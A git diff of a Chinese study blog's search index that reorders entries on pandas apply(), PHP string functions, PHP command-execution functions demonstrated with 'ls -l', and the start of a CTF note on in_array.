class="string">&#x27;A&#x27;</span>] * <span class="number">2</span>, row[<span class="string">&#x27;B&#x27;</span>] * <span class="number">3</span>], index=[<span class="string">&#x27;A_new&#x27;</span>, <span class="string">&#x27;B_new&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 apply 方法</span></span><br><span class="line">result = df.apply(custom_function, axis=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
-
-<p>这里自定义函数返回一个 <code>Series</code>，<code>apply</code> 会将这些 <code>Series</code> 组合成一个新的 <code>DataFrame</code>。</p>
-<p>综上所述，<code>pandas</code> 的 <code>apply</code> 方法为数据处理提供了极大的灵活性，能帮助你高效地对数据进行自定义操作。</p>
-<h2 id="读取tsv格式文件"><a href="#读取tsv格式文件" class="headerlink" title="读取tsv格式文件"></a>读取tsv格式文件</h2><ul>
-<li><p>我有如下图一个tsv格式文件:</p>
-</li>
-<li><img src="/2025/03/08/pandas%E5%BA%93%E5%AD%A6%E4%B9%A0/image-20250310134945342.png" class="" title="image-20250310134945342">
-</li>
-<li><p>我该怎么把指定的列提取出来呢</p>
-</li>
-<li></li>
-</ul>
-]]></content>
+    <title>linux基础</title>
+    <url>/2025/01/11/linux%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[]]></content>
       <categories>
-        <category>python</category>
+        <category>Linux</category>
       </categories>
       <tags>
-        <tag>pandas库</tag>
+        <tag>基本符号</tag>
       </tags>
   </entry>
   <entry>
@@ -2302,46 +2309,51 @@ print(new_data)
       </tags>
   </entry>
   <entry>
-    <title>php命令执行函数详解</title>
-    <url>/2025/01/13/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
-    <content><![CDATA[<h3 id="首先辨析-system-passthru"><a href="#首先辨析-system-passthru" class="headerlink" title="首先辨析:system,passthru"></a>首先辨析:system,passthru</h3><p>1.对于system和passthru函数.</p>
-<ul>
-<li>共同点:<br>1.都用来执行外部命令<br>2.都会先把命令的执行结果直接输出到标准输出（例如，在网页上显示或者在命令行终端显示）。</li>
-<li>不同点:<br>1.system具有默认返回值,即会返回命令执行结果的最后一行的最后一个字符,<br>2.对于执行命令的状态值,system函数返回的是0表示命令执行成功,其他值表示命令执行失败,<br>3.并且system是必须要写作:</li>
+    <title>pandas库学习(持续更新)</title>
+    <url>/2025/03/08/pandas%E5%BA%93%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="python-pandas库学习"><a href="#python-pandas库学习" class="headerlink" title="python pandas库学习"></a>python pandas库学习</h1><h2 id="apply-方法"><a href="#apply-方法" class="headerlink" title="apply() 方法"></a><code>apply()</code> 方法</h2><p><code>pandas</code> 中的 <code>apply</code> 方法是一个非常灵活且强大的工具，可用于对 <code>Series</code> 或 <code>DataFrame</code> 对象中的元素、行或列应用自定义函数。下面为你从多个方面详细介绍其用法。</p>
+<h3 id="1-对-Series-对象使用-apply"><a href="#1-对-Series-对象使用-apply" class="headerlink" title="1. 对 Series 对象使用 apply"></a>1. 对 <code>Series</code> 对象使用 <code>apply</code></h3><p><code>Series</code> 是一维带标签数组，<code>apply</code> 可对其中每个元素应用指定函数。</p>
+<h4 id="基础示例"><a href="#基础示例" class="headerlink" title="基础示例"></a>基础示例</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 Series</span></span><br><span class="line">s = pd.Series([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个简单的函数，用于将元素乘以 2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multiply_by_two</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x * <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 apply 方法应用函数</span></span><br><span class="line">result = s.apply(multiply_by_two)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，<code>multiply_by_two</code> 函数被应用到 <code>Series</code> 的每个元素上，将每个元素都乘以 2。</p>
+<h4 id="使用匿名函数（lambda-函数）"><a href="#使用匿名函数（lambda-函数）" class="headerlink" title="使用匿名函数（lambda 函数）"></a>使用匿名函数（<code>lambda</code> 函数）</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">s = pd.Series([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"><span class="comment"># 使用 lambda 函数进行同样的操作</span></span><br><span class="line">result = s.apply(<span class="keyword">lambda</span> x: x * <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p><code>lambda</code> 函数让代码更简洁，适合实现简单逻辑。</p>
+<h3 id="2-对-DataFrame-对象使用-apply"><a href="#2-对-DataFrame-对象使用-apply" class="headerlink" title="2. 对 DataFrame 对象使用 apply"></a>2. 对 <code>DataFrame</code> 对象使用 <code>apply</code></h3><p><code>DataFrame</code> 是二维表格型数据结构，<code>apply</code> 可按行或列应用函数，通过 <code>axis</code> 参数控制。</p>
+<h4 id="按列应用函数（axis-0）"><a href="#按列应用函数（axis-0）" class="headerlink" title="按列应用函数（axis = 0）"></a>按列应用函数（<code>axis = 0</code>）</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 DataFrame</span></span><br><span class="line">df = pd.DataFrame(&#123;</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数，用于计算每列的和</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_sum</span>(<span class="params">column</span>):</span><br><span class="line">    <span class="keyword">return</span> column.<span class="built_in">sum</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 apply 按列应用函数</span></span><br><span class="line">result = df.apply(column_sum, axis=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p>这里 <code>axis = 0</code> 表示按列操作，函数会依次对每列进行计算。</p>
+<h4 id="按行应用函数（axis-1）"><a href="#按行应用函数（axis-1）" class="headerlink" title="按行应用函数（axis = 1）"></a>按行应用函数（<code>axis = 1</code>）</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(&#123;</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数，用于计算每行的和</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">row_sum</span>(<span class="params">row</span>):</span><br><span class="line">    <span class="keyword">return</span> row[<span class="string">&#x27;A&#x27;</span>] + row[<span class="string">&#x27;B&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 apply 按行应用函数</span></span><br><span class="line">result = df.apply(row_sum, axis=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p><code>axis = 1</code> 表示按行操作，函数会依次对每行进行计算。</p>
+<h3 id="3-传递额外参数"><a href="#3-传递额外参数" class="headerlink" title="3. 传递额外参数"></a>3. 传递额外参数</h3><p><code>apply</code> 方法允许传递额外参数给自定义函数。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">s = pd.Series([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数，接受额外参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_value</span>(<span class="params">x, value</span>):</span><br><span class="line">    <span class="keyword">return</span> x + value</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 apply 并传递额外参数</span></span><br><span class="line">result = s.apply(add_value, args=(<span class="number">3</span>,))</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，<code>args</code> 参数是一个元组，包含要传递给 <code>add_value</code> 函数的额外参数。</p>
+<h3 id="4-处理缺失值"><a href="#4-处理缺失值" class="headerlink" title="4. 处理缺失值"></a>4. 处理缺失值</h3><p><code>apply</code> 方法会自动处理缺失值（<code>NaN</code>），它会将缺失值原样保留。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">s = pd.Series([<span class="number">1</span>, np.nan, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">square</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x ** <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 apply 方法</span></span><br><span class="line">result = s.apply(square)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，<code>NaN</code> 值在处理后依然是 <code>NaN</code>。</p>
+<h3 id="5-返回不同类型结果"><a href="#5-返回不同类型结果" class="headerlink" title="5. 返回不同类型结果"></a>5. 返回不同类型结果</h3><p><code>apply</code> 方法可以返回不同类型的结果，例如返回 <code>Series</code> 或 <code>DataFrame</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(&#123;</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数，返回一个 Series</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_function</span>(<span class="params">row</span>):</span><br><span class="line">    <span class="keyword">return</span> pd.Series([row[<span class="string">&#x27;A&#x27;</span>] * <span class="number">2</span>, row[<span class="string">&#x27;B&#x27;</span>] * <span class="number">3</span>], index=[<span class="string">&#x27;A_new&#x27;</span>, <span class="string">&#x27;B_new&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 apply 方法</span></span><br><span class="line">result = df.apply(custom_function, axis=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p>这里自定义函数返回一个 <code>Series</code>，<code>apply</code> 会将这些 <code>Series</code> 组合成一个新的 <code>DataFrame</code>。</p>
+<p>综上所述，<code>pandas</code> 的 <code>apply</code> 方法为数据处理提供了极大的灵活性，能帮助你高效地对数据进行自定义操作。</p>
+<h2 id="读取tsv格式文件"><a href="#读取tsv格式文件" class="headerlink" title="读取tsv格式文件"></a>读取tsv格式文件</h2><ul>
+<li><p>我有如下图一个tsv格式文件:</p>
+</li>
+<li><img src="/2025/03/08/pandas%E5%BA%93%E5%AD%A6%E4%B9%A0/image-20250310134945342.png" class="" title="image-20250310134945342">
+</li>
+<li><p>我该怎么把指定的列提取出来呢</p>
+</li>
+<li></li>
 </ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -l&quot;</span>,<span class="variable">$return_var</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;命令执行状态值为: &quot;</span>.<span class="variable">$return_var</span>;</span><br></pre></td></tr></table></figure>
-<p>即必须要在后面加上一个变量作为命令执行状态值的接收变量,然后通过echo输出命令执行状态值.<br>4.而passthru函数则没有这个要在后面多写一个变量接收命令执行状态值的步骤的规定,它的返回值直接就是0表示命令执行成功,其他值表示命令执行失败.<br><strong>小结:</strong><br>它们最大的区别就是默认的返回值,system函数返回的是命令执行结果的最后一行的最后一个字符<br>而passthru函数则是直接返回命令执行状态.</p>
-<h3 id="shell-exec函数"><a href="#shell-exec函数" class="headerlink" title="shell_exec函数"></a>shell_exec函数</h3><p>执行外部命令，并将命令的输出作为字符串返回，不会自动输出到标准输出，需要手动使用 echo 或其他输出函数进行输出。<br>如果命令执行失败或没有输出，将返回 null。<br>比如:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 执行 ls 命令，并存储命令输出</span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ls -l&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Output from shell_exec function:\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$output</span>!== <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Command failed or no output.\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 ]]></content>
       <categories>
-        <category>php</category>
+        <category>python</category>
       </categories>
       <tags>
-        <tag>命令执行函数</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php字符串处理函数</title>
-    <url>/2025/01/13/php%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[<h3 id="php字符串处理函数"><a href="#php字符串处理函数" class="headerlink" title="php字符串处理函数"></a>php字符串处理函数</h3><h4 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr() 函数"></a>substr() 函数</h4><p>语法: substr(string, start, length)<br>功能: 返回字符串的子串，从 start 位置开始，长度为 length。<br>如；</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">5</span>); <span class="comment">//输出 &quot;Hello&quot;</span></span><br></pre></td></tr></table></figure>
-<p>如果最后一个参数为1,就是指选中那个位置的字符.<br><strong>补充</strong>: md5_substr() 函数用来处理中文字符串</p>
-<p>特性:<br>1.如果在substr()第一个位置里面写入的值为一个文件名,那么substr是读取&#x2F;截取的这个文件本身名字的一部分,并非文件内部代码的一部分。</p>
-<h4 id="intval-函数"><a href="#intval-函数" class="headerlink" title="intval() 函数"></a>intval() 函数</h4><p>语法: intval(string)<br><strong>机制1</strong>:<br>若前缀为0x，则认为是十六进制数；<br>若前缀为0，则认为是八进制数；<br>若没有前缀，则认为是十进制数。<br>最后都是转化为10进制数整数<br><strong>机制2:</strong><br>对于第二个参数:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo intval(123.12,0)</span><br></pre></td></tr></table></figure>
-<p>为0,则自动检测进制,最终都是把第一个参数转换为10进制整数;<br>为2,8,16则为对应进制的数。<br><strong>功能</strong>: 将字符串转换为整数。<br>如:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;123.456&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$str</span>); <span class="comment">//输出 123</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="str-replace-函数"><a href="#str-replace-函数" class="headerlink" title="str_replace() 函数"></a>str_replace() 函数</h4><p>语法: str_replace(search, replace, subject)<br>功能: 在 subject 中搜索 search，并替换为 replace。</p>
-<h4 id="strpos-函数"><a href="#strpos-函数" class="headerlink" title="strpos()函数"></a>strpos()函数</h4><p>语法:strpos(string,find,start)<br>最后的start是可选,规定了开始的位置。</p>
-]]></content>
-      <categories>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>php字符串处理函数</tag>
+        <tag>pandas库</tag>
       </tags>
   </entry>
   <entry>
@@ -2373,14 +2385,25 @@ print(new_data)
       </tags>
   </entry>
   <entry>
-    <title>php比较字符1</title>
-    <url>/2025/01/11/php%E6%AF%94%E8%BE%83%E5%AD%97%E7%AC%A61/</url>
-    <content><![CDATA[]]></content>
+    <title>php字符串处理函数</title>
+    <url>/2025/01/13/php%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<h3 id="php字符串处理函数"><a href="#php字符串处理函数" class="headerlink" title="php字符串处理函数"></a>php字符串处理函数</h3><h4 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr() 函数"></a>substr() 函数</h4><p>语法: substr(string, start, length)<br>功能: 返回字符串的子串，从 start 位置开始，长度为 length。<br>如；</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">5</span>); <span class="comment">//输出 &quot;Hello&quot;</span></span><br></pre></td></tr></table></figure>
+<p>如果最后一个参数为1,就是指选中那个位置的字符.<br><strong>补充</strong>: md5_substr() 函数用来处理中文字符串</p>
+<p>特性:<br>1.如果在substr()第一个位置里面写入的值为一个文件名,那么substr是读取&#x2F;截取的这个文件本身名字的一部分,并非文件内部代码的一部分。</p>
+<h4 id="intval-函数"><a href="#intval-函数" class="headerlink" title="intval() 函数"></a>intval() 函数</h4><p>语法: intval(string)<br><strong>机制1</strong>:<br>若前缀为0x，则认为是十六进制数；<br>若前缀为0，则认为是八进制数；<br>若没有前缀，则认为是十进制数。<br>最后都是转化为10进制数整数<br><strong>机制2:</strong><br>对于第二个参数:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo intval(123.12,0)</span><br></pre></td></tr></table></figure>
+<p>为0,则自动检测进制,最终都是把第一个参数转换为10进制整数;<br>为2,8,16则为对应进制的数。<br><strong>功能</strong>: 将字符串转换为整数。<br>如:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;123.456&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$str</span>); <span class="comment">//输出 123</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="str-replace-函数"><a href="#str-replace-函数" class="headerlink" title="str_replace() 函数"></a>str_replace() 函数</h4><p>语法: str_replace(search, replace, subject)<br>功能: 在 subject 中搜索 search，并替换为 replace。</p>
+<h4 id="strpos-函数"><a href="#strpos-函数" class="headerlink" title="strpos()函数"></a>strpos()函数</h4><p>语法:strpos(string,find,start)<br>最后的start是可选,规定了开始的位置。</p>
+]]></content>
       <categories>
         <category>php</category>
       </categories>
       <tags>
-        <tag>php比较字符</tag>
+        <tag>php字符串处理函数</tag>
       </tags>
   </entry>
   <entry>
@@ -2409,11 +2432,43 @@ fclose($file);
       </tags>
   </entry>
   <entry>
+    <title>php命令执行函数详解</title>
+    <url>/2025/01/13/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
+    <content><![CDATA[<h3 id="首先辨析-system-passthru"><a href="#首先辨析-system-passthru" class="headerlink" title="首先辨析:system,passthru"></a>首先辨析:system,passthru</h3><p>1.对于system和passthru函数.</p>
+<ul>
+<li>共同点:<br>1.都用来执行外部命令<br>2.都会先把命令的执行结果直接输出到标准输出（例如，在网页上显示或者在命令行终端显示）。</li>
+<li>不同点:<br>1.system具有默认返回值,即会返回命令执行结果的最后一行的最后一个字符,<br>2.对于执行命令的状态值,system函数返回的是0表示命令执行成功,其他值表示命令执行失败,<br>3.并且system是必须要写作:</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -l&quot;</span>,<span class="variable">$return_var</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;命令执行状态值为: &quot;</span>.<span class="variable">$return_var</span>;</span><br></pre></td></tr></table></figure>
+<p>即必须要在后面加上一个变量作为命令执行状态值的接收变量,然后通过echo输出命令执行状态值.<br>4.而passthru函数则没有这个要在后面多写一个变量接收命令执行状态值的步骤的规定,它的返回值直接就是0表示命令执行成功,其他值表示命令执行失败.<br><strong>小结:</strong><br>它们最大的区别就是默认的返回值,system函数返回的是命令执行结果的最后一行的最后一个字符<br>而passthru函数则是直接返回命令执行状态.</p>
+<h3 id="shell-exec函数"><a href="#shell-exec函数" class="headerlink" title="shell_exec函数"></a>shell_exec函数</h3><p>执行外部命令，并将命令的输出作为字符串返回，不会自动输出到标准输出，需要手动使用 echo 或其他输出函数进行输出。<br>如果命令执行失败或没有输出，将返回 null。<br>比如:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 执行 ls 命令，并存储命令输出</span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ls -l&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Output from shell_exec function:\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$output</span>!== <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Command failed or no output.\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>命令执行函数</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php比较字符1</title>
+    <url>/2025/01/11/php%E6%AF%94%E8%BE%83%E5%AD%97%E7%AC%A61/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>php比较字符</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>php特性入门</title>
     <url>/2025/04/05/php%E7%89%B9%E6%80%A7%E5%85%A5%E9%97%A8/</url>
     <content><![CDATA[<h1 id="in-array函数漏洞"><a href="#in-array函数漏洞" class="headerlink" title="in_array函数漏洞"></a>in_array函数漏洞</h1><ul>
 <li>如题:(ctfshow web99)</li>
-<li><style>.hnclrqjfider{zoom: 50%;}</style><img src="/2025/04/05/php%E7%89%B9%E6%80%A7%E5%85%A5%E9%97%A8/image-20250405202932475.png" class="hnclrqjfider" alt="image-20250405202932475"></li>
+<li><style>.ucsmcusrbtyg{zoom: 50%;}</style><img src="/2025/04/05/php%E7%89%B9%E6%80%A7%E5%85%A5%E9%97%A8/image-20250405202932475.png" class="ucsmcusrbtyg" alt="image-20250405202932475"></li>
 <li>这里<code>rand(1,$i)</code>是在从<code>1</code>到<code>$i</code>之间随机选择一个数输出。</li>
 <li><strong>关于in_array</strong>函数的机制:<ul>
 <li>格式:<code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code>,即首位参数为需查询的数值，第二个参数为目标数组，<strong>最后一个参数为是否为严格比较</strong>。</li>
@@ -2592,11 +2647,6 @@ $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];//要把临时�
       </tags>
   </entry>
   <entry>
-    <title>python常见bug</title>
-    <url>/2025/03/18/python%E5%B8%B8%E8%A7%81bug/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>python中对模块的引入</title>
     <url>/2025/01/26/python%E4%B8%AD%E5%AF%B9%E6%A8%A1%E5%9D%97%E7%9A%84%E5%BC%95%E5%85%A5/</url>
     <content><![CDATA[<h1 id="python中对模块引入的辨析"><a href="#python中对模块引入的辨析" class="headerlink" title="python中对模块引入的辨析"></a>python中对模块引入的辨析</h1><h2 id="import-from和import的差异"><a href="#import-from和import的差异" class="headerlink" title="import..from和import的差异"></a><code>import..from</code>和<code>import</code>的差异</h2><p>首先我们要说明:</p>
@@ -2631,6 +2681,11 @@ $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];//要把临时�
       <tags>
         <tag>import辨析</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>python常见bug</title>
+    <url>/2025/03/18/python%E5%B8%B8%E8%A7%81bug/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>python异常捕获及处理</title>
@@ -2668,75 +2723,6 @@ $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];//要把临时�
       </categories>
       <tags>
         <tag>python异常</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python装饰器</title>
-    <url>/2025/03/20/python%E8%A3%85%E9%A5%B0%E5%99%A8/</url>
-    <content><![CDATA[<h1 id="classmethod"><a href="#classmethod" class="headerlink" title="@classmethod"></a>@classmethod</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><ul>
-<li><p><code>@classmethod</code> 是 Python 中的一个装饰器，作用是把一个方法封装成类方法 。</p>
-</li>
-<li><p>类方法是什么，就是可以直接使用类，无需实例化调用的方法叫做类方法。</p>
-</li>
-<li><p>比如:</p>
-</li>
-<li><pre><code class="language-python">class DateUtils:    
-    @classmethod
-    def get_time(cls):
-        import datetime
-        return datetime.datetime.now()
- 
-#类调用
-year1 = DateUtils.get_time
-print(year1)
-
-#实例化后调用
-date = DateUtils()
-year2 =n date.get_time
-print(year2)
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># @model_validator(mode=&quot;&quot;)(pydantic库)</span><br><span class="line"></span><br><span class="line">## 可输入参数:</span><br><span class="line"></span><br><span class="line">* `before`和`after`</span><br><span class="line"></span><br><span class="line">* 区别如下:</span><br><span class="line"></span><br><span class="line">  - `@model_validator(mode=&quot;before&quot;)` 在`pydantic`模型进行内置类型和约束验证前执行 ，处理的是原始输入数据，通常为字典形式。可以对数据进行转换，如将字符串转为数字，还能进行数据清理等操作，之后返回处理过的字典供后续验证。比如输入的日期是多种字符串格式，可在`before`验证中统一转换为指定日期格式。</span><br><span class="line"></span><br><span class="line">  - `@model_validator(mode=&quot;after&quot;)` 在模型完成内置验证后执行，此时面对的是已经初步验证通过的模型实例对象，不能对数据来源进行转换，但能基于完整的实例对象做进一步检查。</span><br><span class="line"></span><br><span class="line">  - 通俗地来说`@model_validator`中参数为`before`时该模型中的检查方法更倾向于对输入格式的检查和转换</span><br><span class="line"></span><br><span class="line">  - 而后者，即参数为`after`的时候，更加倾向于在数据格式都毫无疑问的时候，单纯对数据大小关系进行检查，其重点没有放在格式上面，而是数值关系，所以叫`after`。</span><br><span class="line"></span><br><span class="line">    ```python</span><br><span class="line">    from pydantic import BaseModel, model_validator</span><br><span class="line">    </span><br><span class="line">    class TimeInterval(BaseModel):</span><br><span class="line">        start_time: int</span><br><span class="line">        end_time: int</span><br><span class="line">    </span><br><span class="line">        @model_validator(mode=&quot;after&quot;)</span><br><span class="line">        def check_time_order(cls, instance):</span><br><span class="line">            if instance.start_time &gt;= instance.end_time:</span><br><span class="line">                raise ValueError(&quot;开始时间必须早于结束时间&quot;)</span><br><span class="line">            return instance</span><br><span class="line">    </span><br><span class="line">    # 测试</span><br><span class="line">    try:</span><br><span class="line">        time_data = &#123;&quot;start_time&quot;: 1672531200, &quot;end_time&quot;: 1672534800&#125;#直接验证数值大小</span><br><span class="line">        time_interval = TimeInterval(**time_data)</span><br><span class="line">        print(time_interval)</span><br><span class="line">    except ValueError as e:</span><br><span class="line">        print(f&quot;验证失败: &#123;e&#125;&quot;)</span><br></pre></td></tr></table></figure>
-</code></pre>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>python装饰器</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python程序运行启动代码</title>
-    <url>/2025/01/26/python%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E5%90%AF%E5%8A%A8%E4%BB%A3%E7%A0%81/</url>
